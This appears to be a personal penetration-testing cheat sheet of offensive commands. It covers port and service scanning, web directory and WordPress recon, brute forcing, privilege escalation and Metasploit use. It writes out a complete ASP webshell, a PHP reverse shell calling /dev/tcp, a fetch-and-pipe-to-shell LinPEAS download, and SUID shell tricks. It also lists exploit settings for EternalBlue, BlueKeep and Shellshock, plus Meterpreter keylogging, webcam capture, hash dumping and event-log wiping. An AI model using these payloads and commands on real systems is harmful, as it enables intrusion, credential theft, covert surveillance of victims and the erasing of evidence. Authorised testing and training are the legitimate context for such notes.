# 72 97 99 107 105 110 103  78 111 116 101 115 
---
## Common ports 

| Port    | Protocol | Service / Description            |
| ------- | -------- | -------------------------------- |
| 21      | TCP      | FTP control                      |
| 22      | TCP      | SSH                              |
| 23      | TCP      | Telnet                           |
| 25      | TCP      | SMTP                             |
| 53      | TCP/UDP  | DNS                              |
| 67      | UDP      | DHCP server                      |
| 68      | UDP      | DHCP client                      |
| 69      | UDP      | TFTP                             |
| 80      | TCP      | HTTP                             |
| 110     | TCP      | POP3                             |
| 123     | UDP      | NTP                              |
| 137–139 | UDP      | NetBIOS Name/Datagram/Session    |
| 143     | TCP      | IMAP                             |
| 161     | UDP      | SNMP                             |
| 162     | UDP      | SNMP Trap                        |
| 389     | TCP/UDP  | LDAP                             |
| 443     | TCP      | HTTPS                            |
| 445     | TCP      | Microsoft-DS (SMB over TCP)      |
| 465 | TCP  | SMTPS (SMTP over SSL/TLS)   |
| 514     | UDP      | Syslog                           |
| 520     | UDP      | RIP                              |
| 587     | TCP      | SMTP (submission)                |
| 631     | TCP/UDP  | IPP (Internet Printing Protocol) |
| 993     | TCP      | IMAPS                            |
| 995     | TCP      | POP3S                            |
| 1433    | TCP      | Microsoft SQL Server             |
| 1521    | TCP      | Oracle DB listener               |
| 3306    | TCP      | MySQL                            |
| 3389    | TCP/UDP  | RDP                              |
| 5900    | TCP      | VNC                              |
| 8080    | TCP      | HTTP-alt                         |


## Configuration Files & Tools

| Description             | Command        | Syntax                                                  |
|-------------------------|----------------|----------------------------------------------------------|
| Use VPN                 | openvpn        | `openvpn [FILE.ovpn]`                                   |
| TCP Nmap Scan (no ping) | nmap           | `nmap -Pn [IP]/[RANGE]`                                 |
| UDP Nmap Scan           | nmap           | `nmap -sU [IP]/[RANGE]`                                 |

## Nmap Banner & Version Scanning Examples

```bash
# 1. Version + banner grab
nmap -sV --script=banner <target>

# 2. Default safe scripts + version detection
nmap -sV -sC <target>

# 3. HTTP title and headers on web server
nmap -p 80,443 --script=http-title,http-headers <target>

# 4. FTP banner + anonymous login check
nmap -p 21 --script=banner,ftp-anon <target>

# 5. SSH hostkey and banner grab
nmap -p 22 --script=ssh-hostkey,banner <target>

# 6. UDP version scan + DNS recursion check
nmap -sU -p 53 -sV --script=dns-recursion <target>

# 7. Intense version scan + all version scripts
nmap -sV --version-intensity 9 --script "version and" <target>
```

- **Nmap (banner + version)**  
  `nmap -sV --script=banner <target>`

- **Netcat SMTP banner + HELO**  
  `nc <target> 25 && echo -e "HELO <hostname>\r\nQUIT\r\n"`

- **SMTP user enumeration**  
  `smtp-user-enum -t <target> -U /path/to/usernames.txt`


## WMAP (Web Scanner in Metasploit)
Scan web applications for common vulnerabilities using Metasploit's built-in WMAP module.
```bash
# Start Metasploit
msfconsole

# Add a target site
wmap_sites -a http://<target-site>

# List all targets
wmap_sites -l

# Crawl the web application
wmap_run -t <target-id>

# Run enabled vuln modules
wmap_run -e

# List all WMAP modules
wmap_modules -l

# Enable a specific module
wmap_modules -e auxiliary/scanner/http/dir_scanner

```
# WebDAV Discovery & Upload with DAVTest
davtest -url http://<target>/webdav/ -methods all -upload

# Interactive WebDAV with Cadaver (upload shell.asp)
cadaver http://<target>/webdav/ << 'EOF'
put shell.asp
EOF


# Create ASP Webshell (shell.asp)

```bash
cat << 'EOF' > shell.asp
<%
  Set cmd = Request.QueryString("cmd")
  If cmd <> "" Then
    Set o = CreateObject("WScript.Shell")
    Set p = o.Exec(cmd)
    Response.Write "<pre>" & p.StdOut.ReadAll() & "</pre>"
  End If
%>
EOF
```
# Execute Webshell
# Browse to: http://<target>/webdav/shell.asp?cmd=whoami


## IIS WebDAV ASP Upload (CVE-2017-7269)

```bash
msfconsole -q

# Load the exploit module
use exploit/windows/iis/iis_webdav_upload_asp

# Set required options
set RHOSTS 
set HttpUsername 
set HttpPassword 
set PATH /webdav/%RAND%.asp
```
## PsExec SMB Remote Code Execution

Leverages valid SMB credentials to remotely execute commands on a Windows machine using the **PsExec** technique. This method does **not exploit a vulnerability**, but instead uses **legitimate admin access** over SMB (port 445) to gain a foothold or move laterally.

```bash
# Start Metasploit without banner (quieter startup)
msfconsole -q

# Load PsExec exploit module
use exploit/windows/smb/psexec

# Set the remote target
set RHOSTS <target-ip-or-host>

# Provide SMB credentials (must be a local admin on the target)
set SMBUser <username>
set SMBPass <password>

# Launch the exploit (starts a session)
exploit
```

## RDP Brute Force and Enumeration

| Task / Step                                 | Command / Syntax                                                                 |
|---------------------------------------------|----------------------------------------------------------------------------------|
| **Brute-force RDP login with Hydra**        | ```bash<br>hydra -L /path/to/userlist.txt \<br>     -P /path/to/passwordlist.txt \<br>     rdp://[TARGET] -s [PORT]<br>``` |
| **Use RDP Scanner (check RDP enabled)**     | ```bash<br>use auxiliary/scanner/rdp/rdp_scanner<br>set RHOSTS [TARGET]<br>run<br>``` |
| **Scan for BlueKeep (CVE-2019-0708)**       | ```bash<br>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep<br>set RHOSTS [TARGET]<br>run<br>``` |
| **Exploit BlueKeep (RCE)** *(optional)*     | ```bash<br>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce<br>set RHOSTS [TARGET]<br>set RPORT 3389<br>set TARGET 1<br>set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>set LHOST [YOUR-IP]<br>set LPORT 4444<br>exploit<br>``` |
| **Connect using xfreerdp** *(if creds found)* | ```bash<br>xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:[TARGET]:[PORT]<br>``` |



## Directory Discovery with Gobuster

| Description             | Command                                                                 |
|-------------------------|-------------------------------------------------------------------------|
| Standard scan           | `gobuster dir -u http://[IP]/ -w /usr/share/wordlists/dirb/common.txt` |
| Using SOCKS5 proxy      | `gobuster dir -p socks5://[IP]:[PORT] --url http://[IP]/ -w common.txt`|

---

## Web & Content Discovery

| Description | Command     | Syntax                   |
|-------------|-------------|--------------------------|
| Robots.txt  | curl/browser| `http://[IP]/robots.txt` |

---

## File/Data Analysis

| Description     | Command | Syntax            |
|-----------------|---------|-------------------|
| Extract strings | strings | `strings [FILE]`  |

---

## WordPress Recon

| Description       | Examples/Paths                     |
|-------------------|------------------------------------|
| Backup/Swap Files | `[file].swp`, `.bak`, `.old`, etc. |

---

## Access

| Service    | Command Syntax                                |
|------------|------------------------------------------------|
| FTP        | `ftp [IP]`                                     |
| SSH        | `ssh [user]@[IP]`                              |
| SMB List   | `smbclient -L \\\\[IP]`                        |
| SMB Access | `smbclient \\\\[IP]\\[Share]`                  |

---

## Dictionary & Wordlist Generation

| Tool | Command                   | Syntax                         |
|------|---------------------------|--------------------------------|
| cewl | Generate custom wordlist  | `cewl [URL] > wordlist.txt`    |

---

## Bruteforce Attacks

| Tool     | Description                      | Syntax                                                                                     |
|----------|----------------------------------|--------------------------------------------------------------------------------------------|
| hydra    | HTTP form brute force            | `hydra -L [USERS] -P [PASSWORDS] [IP] -s [PORT] http-post-form "[url]:...:Invalid" -V`    |
| wpscan   | WordPress login brute force      | `wpscan --url [URL] -U [USER] -P [WORDLIST]`                                               |

---

## Privilege Escalation

| Task                    | Command / Path                                                |
|-------------------------|---------------------------------------------------------------|
| Download LinPEAS        | `curl [IP]:8000/linpeas.sh | sh`                              |
| Start HTTP server       | `python3 -m http.server 8000`                                |
| Start Netcat listener   | `nc -lvnp [PORT]`                                             |
| Spawn TTY shell         | `python3 -c 'import pty; pty.spawn("/bin/bash")'`             |
| Reverse shell (PHP)     | See code block below                                          |
| Find SUID exploit       | `find . -exec /bin/sh -p \; -quit`                            |
| Make binary SUID        | `chmod u+s /tmp/bash`                                         |

#### PHP Reverse Shell Example

```php
<?php
if (isset($_GET['trigger'])) {
    exec("/bin/bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'");
}
?>
```
Access at: `http://[IP]/wp-content/themes/[THEME]/404.php?trigger=1`

---

## Binary Exploits (Python)

```python
import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")
os.system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash")
```

---

## Escape Restricted Shell

| Method      | Command                                |
|-------------|-----------------------------------------|
| Vim escape  | `:!/bin/sh`<br>`:set shell=/bin/bash`<br>`:shell` |
| Tab check   | Press `TAB TAB` to list allowed commands |

---

## Process Snooping Without Root

| Tool     | Description               | Command/Source                                              |
|----------|---------------------------|--------------------------------------------------------------|
| pspy     | Monitor processes         | `./pspy64s` (from [pspy GitHub](https://github.com/DominicBreuker/pspy)) |

---

## Port Scanning One-Liner (Python)

```python
python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list(ipaddress.IPv4Network("10.10.10.0/24").hosts())[100:200] for p in range(1,65535) if not socket.socket().connect_ex((str(ip),p))]'
```

---

## SSH Tunneling

| Task              | Syntax                                 |
|-------------------|----------------------------------------|
| Dynamic tunnel    | `ssh -D [PORT] [USER]@[IP]`            |

---

## Local File Inclusion - Base64 Read

| Task                | URL Example                                                                 |
|---------------------|------------------------------------------------------------------------------|
| Base64 encode read  | `http://[IP]/page=php://filter/convert.base64-encode/resource=wp-config.php` |

---

## Metasploit Basics

| Task                | Command                                   |
|---------------------|-------------------------------------------|
| Start               | `msfconsole`                              |
| Search modules      | `search <keyword>`                        |
| Load module         | `use <module_path>`                       |
| Show options        | `show options`                            |
| Set target IP       | `set RHOSTS <target-ip>`                  |
| Set local IP        | `set LHOST <your-ip>`                     |
| Set payload         | `set PAYLOAD <payload>`                   |
| Exploit             | `run` or `exploit`                        |
| List sessions       | `sessions`                                |
| Interact with session| `sessions -i <id>`                       |

## Meterpreter Commands

| Command               | Description                                      |
|-----------------------|--------------------------------------------------|
| `help`                | Show all available Meterpreter commands          |
| `sysinfo`             | Get target system information                    |
| `getuid`              | Display current user ID                          |
| `ipconfig`            | Show network interfaces of the victim            |
| `ifconfig`            | Same as above (alias)                            |
| `shell`               | Drop into a standard command shell               |
| `background`          | Send Meterpreter session to background           |
| `sessions`            | List all active sessions                         |
| `sessions -i [ID]`    | Interact with a specific session                 |
| `upload [src] [dst]`  | Upload file to the target                        |
| `download [src]`      | Download file from the target                    |
| `edit [file]`         | Open a file on target in an editor               |
| `cat [file]`          | Output contents of a file                        |
| `pwd`                 | Print working directory on the target            |
| `cd [dir]`            | Change directory on the target                   |
| `ls`                  | List files in the current directory              |
| `ps`                  | List running processes                           |
| `migrate [PID]`       | Migrate to another process (for stability)       |
| `getprivs`            | Enumerate current session privileges             |
| `use stdapi`          | Load standard API (if not loaded automatically)  |
| `keyscan_start`       | Start keylogger                                  |
| `keyscan_dump`        | Dump recorded keystrokes                         |
| `screenshot`          | Take a screenshot of the victim desktop          |
| `webcam_list`         | List available webcams                           |
| `webcam_snap`         | Take a snapshot using the webcam                 |
| `record_mic`          | Record microphone audio                          |
| `hashdump`            | Dump password hashes (if permissions allow)      |
| `clearev`             | Clear event logs on the target          

---

## MySQL Auxiliary Modules

- **auxiliary/scanner/mysql/mysql_version**  
  Connects to a MySQL server and retrieves its version banner. Useful to determine if the target is running a vulnerable version.

- **auxiliary/scanner/mysql/mysql_login**  
  Attempts to log in to MySQL using a supplied username/password (or a password list). Helps identify valid credentials.

- **auxiliary/admin/mysql/mysql_enum**  
  Gathers general MySQL information: users, databases, privileges, and version. Great for mapping out the target’s schema and user base.

- **auxiliary/admin/mysql/mysql_sql**  
  Allows you to run arbitrary SQL queries on the target once authenticated. Enables custom data extraction or manipulation.

- **auxiliary/scanner/mysql/mysql_file_enum**  
  Tries to enumerate files on the database host by exploiting MySQL’s `LOAD_FILE()` function. Can reveal configuration files, credentials, etc.

- **auxiliary/scanner/mysql/mysql_hashdump**  
  After authenticating, retrieves stored password hashes from the `mysql.user` table. These can then be cracked offline.

- **auxiliary/scanner/mysql/mysql_schemadump**  
  Connects and dumps schema metadata (tables, columns, types) across all databases. Builds a full picture of the database structure.

- **auxiliary/scanner/mysql/mysql_writable_dirs**  
  Enumerates directories on the MySQL server host where the `INTO OUTFILE` command is permitted. Useful for writing files (e.g., web shells) to disk.

## SSH Auxiliary Modules

- **auxiliary/scanner/ssh/ssh_version**  
  Connects to an SSH service and retrieves the version banner (SSH protocol version, server software and version). Helps identify outdated or vulnerable SSH implementations.

- **auxiliary/scanner/ssh/ssh_login**  
  Attempts to authenticate to SSH using a supplied username/password or a password list. Useful for discovering weak or default credentials.

## FTP Auxiliary Modules

- **auxiliary/scanner/ftp/ftp_version**  
  Connects to an FTP service and retrieves its version banner (FTP server software and version). Helps identify outdated or vulnerable FTP implementations.

- **auxiliary/scanner/ftp/ftp_login**  
  Attempts to authenticate to FTP using a supplied username/password or a password list. Useful for discovering weak or default credentials.  

## SMB Examples

| Task              | Command                                  |
|-------------------|-------------------------------------------|
| List shares       | `smbclient -L \\\\[IP]`                   |
| Access share      | `smbclient \\\\[IP]\\[Share]`             |
| Use with proxy    | `proxychains smbclient \\\\[IP]\\[Share]` |

---

## Cleanup and File Checks

| Task                        | Command                            |
|-----------------------------|-------------------------------------|
| Find passwords              | `grep -i password /etc/* 2>/dev/null` |
| Check crontab               | `crontab -l`                        |
| Inspect logout script       | `vim ~/.bash_logout`               |
| Inspect user config         | `vim ~/.config/`                   |

## Exploits & Scanners

| Name                             | CVE           | Tool       | Command                                                                                     | Port   |
| -------------------------------- | ------------- | ---------- | ------------------------------------------------------------------------------------------- | ------ |
| Shellshock (Apache mod\_cgi) | CVE-2014-6271 | Metasploit | `use exploit/multi/http/apache_mod_cgi_bash_env_exec`<br>`set RHOSTS <target>`<br>`exploit` | 80/443 |
| EternalBlue SMB Exploit      | CVE-2017-0144 | Metasploit | `use exploit/windows/smb/ms17_010_eternalblue`<br>`set RHOSTS <target>`<br>`exploit`        | 445    |
| BlueKeep RDP Exploit         | CVE-2019-0708 | Metasploit | `use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`<br>`set RHOSTS <target>`<br>`exploit`  | 3389   |
| BlueKeep RDP Scanner         | (N/A)         | Nmap       | `nmap -p3389 --script rdpscan --script-args rdpscan.hosts=<target>`                         | 3389   |


## WinRM Enumeration and Access

| Tool            | Description                            | Command / Syntax                                                                 |
|-----------------|----------------------------------------|----------------------------------------------------------------------------------|
| **crackmapexec**| Brute-force WinRM auth via domain creds| `crackmapexec winrm [TARGET] -d [DOMAIN] -u usernames.txt -p passwords.txt`     |
| **evil-winrm**  | Remote access with valid credentials   | `evil-winrm -i [TARGET] -u [USER] -p [PASS] -d [DOMAIN]`                         |
